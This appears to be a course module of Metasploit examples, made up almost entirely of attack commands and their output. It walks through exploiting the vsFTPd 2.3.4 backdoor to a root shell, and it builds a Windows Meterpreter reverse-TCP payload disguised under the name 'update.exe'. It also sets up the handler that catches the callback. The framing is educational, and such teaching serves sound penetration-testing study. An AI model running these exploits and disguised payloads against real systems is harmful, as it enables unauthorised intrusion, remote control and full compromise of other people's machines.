# Module 12 Examples: The Metasploit Framework (MSF)

## 1. A Complete Exploitation Session (vsFTPd Backdoor)
A classic example using a known vulnerability in vsFTPd v2.3.4.

**Step 1: Start Metasploit**
```bash
msfconsole
```

**Step 2: Search for the exploit**
```bash
msf6 > search vsftpd 2.3.4
```

**Step 3: Select the exploit**
```bash
msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
```

**Step 4: Configure Options**
```bash
msf6 exploit(...) > show options
msf6 exploit(...) > set RHOSTS 192.168.1.100
```

**Step 5: Execute**
```bash
msf6 exploit(...) > exploit

[*] 192.168.1.100:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 192.168.1.100:21 - USER: 331 Please specify the password.
[+] 192.168.1.100:21 - Backdoor service has been spawned, handling...
[*] Found shell.
[*] Command shell session 1 opened (192.168.1.50:38473 -> 192.168.1.100:6200)
whoami
root
```

## 2. Generating a Payload with MSFVenom
Creating a standalone malicious executable (Reverse TCP Shell).
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f exe -o update.exe
```

## 3. Setting up the Listener
To catch the reverse connection from the payload generated above:
```bash
msfconsole -q
msf6 > use exploit/multi/handler
msf6 > set payload windows/x64/meterpreter/reverse_tcp
msf6 > set LHOST 192.168.1.50
msf6 > set LPORT 4444
msf6 > exploit
[*] Started reverse TCP handler on 192.168.1.50:4444
```
